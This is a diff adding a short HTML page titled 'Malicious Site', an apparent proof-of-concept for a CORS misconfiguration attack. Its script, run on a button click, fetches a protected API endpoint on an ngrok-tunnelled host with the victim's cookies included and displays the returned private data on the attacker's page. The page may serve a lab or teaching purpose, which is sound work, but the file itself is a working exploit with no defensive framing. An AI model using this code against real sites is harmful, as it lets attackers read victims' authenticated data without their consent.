@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Site</title>
+</head>
+<body>
+    <h1>Malicious Site</h1>
+    <button id="exploit">Exploit CORS</button>
+    <pre id="result"></pre>
+
+    <script>
+        document.getElementById('exploit').addEventListener('click', async () => {
+            const response = await fetch('https://GUID.ngrok-free.app/api/protected', {
+                credentials: 'include' // Include cookies
+            });
+
+            const result = await response.json();
+            document.getElementById('result').textContent = JSON.stringify(result, null, 2);
+        });
+    </script>
+</body>
+</html>
